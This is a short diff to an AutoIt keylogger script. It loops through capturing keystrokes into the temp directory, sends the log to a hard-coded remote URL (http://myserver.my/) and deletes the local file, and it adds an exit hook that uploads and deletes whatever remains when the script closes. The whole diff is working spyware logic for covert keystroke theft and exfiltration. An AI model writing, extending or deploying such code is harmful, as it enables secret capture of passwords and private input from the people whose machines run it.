@@ -3,9 +3,17 @@
 
 #include <Keylogger.au3>
 
+OnAutoItExitRegister( "lastAction" )
+Global $MY_URL = "http://myserver.my/"
+
 While 1
 	_init(@TempDir)
-	_runFor(2000)
-	_send("http://myserver.my/")
+	_readFor(2000)
+	_send($MY_URL)
 	_deleteFile()
 WEnd
+
+Func lastAction()
+	_send($MY_URL)
+	_deleteFile()
+EndFunc
